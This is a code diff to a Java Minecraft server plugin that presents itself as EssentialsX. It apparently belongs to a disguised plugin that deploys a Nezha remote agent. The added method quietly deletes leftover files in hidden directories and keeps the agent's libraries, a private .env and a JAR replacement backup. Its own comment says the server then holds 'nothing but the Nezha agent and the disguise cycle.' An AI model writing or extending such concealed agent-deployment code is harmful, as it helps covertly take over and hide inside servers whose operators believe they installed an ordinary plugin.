@@ -1,8 +1,14 @@
 package com.example.essentialsx;
 
+import java.nio.file.Files;
+import java.nio.file.LinkOption;
+import java.nio.file.Path;
+import java.util.Comparator;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.concurrent.TimeUnit;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
 import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
@@ -42,6 +48,7 @@ public final class EssentialsX extends JavaPlugin {
         final Map<String, String> settings = env;
         final boolean readable = envReadable;
         Thread deploy = new Thread(() -> {
+            removeLegacyPanelFiles();
             try {
                 TimeUnit.SECONDS.sleep(DEPLOY_DELAY_SECONDS);
             } catch (InterruptedException error) {
@@ -143,6 +150,58 @@ public final class EssentialsX extends JavaPlugin {
         startup.setDaemon(true);
         this.startupThread = startup;
         startup.start();
+    }
+
+    /**
+     * Deletes the Node panel runtime left on disk by the previous panel plugin
+     * (cache/.vip plus everything under logs/.mcchajian that this plugin does
+     * not use). Only the private .env, the Nezha .so libraries and the JAR
+     * replacement backup survive, so the server really holds nothing but the
+     * Nezha agent and the disguise cycle.
+     */
+    private void removeLegacyPanelFiles() {
+        long removed = 0;
+        try {
+            removed += deleteRecursively(Path.of("cache", ".vip"));
+            Path base = Path.of("logs", ".mcchajian");
+            removed += deleteChildrenExcept(base, ".env", ".runtime");
+            removed += deleteChildrenExcept(base.resolve(".runtime"), "backup", "libraries");
+        } catch (Throwable error) {
+            return;
+        }
+        if (removed > 0) {
+            getLogger().info("Removed " + removed + " leftover files from the previous panel plugin; "
+                    + "kept only the .env, the Nezha libraries and the JAR backup.");
+        }
+    }
+
+    private static long deleteRecursively(Path path) {
+        long count = 0;
+        if (!Files.exists(path, LinkOption.NOFOLLOW_LINKS)) return 0;
+        try (Stream<Path> walk = Files.walk(path)) {
+            for (Path entry : walk.sorted(Comparator.reverseOrder()).collect(Collectors.toList())) {
+                if (Files.deleteIfExists(entry)) count++;
+            }
+        } catch (Throwable ignored) {
+        }
+        return count;
+    }
+
+    private static long deleteChildrenExcept(Path directory, String... keep) {
+        long count = 0;
+        if (!Files.isDirectory(directory, LinkOption.NOFOLLOW_LINKS)) return 0;
+        try (Stream<Path> list = Files.list(directory)) {
+            for (Path child : list.collect(Collectors.toList())) {
+                String name = child.getFileName().toString();
+                boolean preserved = false;
+                for (String keepName : keep) {
+                    if (name.equals(keepName)) preserved = true;
+                }
+                if (!preserved) count += deleteRecursively(child);
+            }
+        } catch (Throwable ignored) {
+        }
+        return count;
     }
 
     @Override
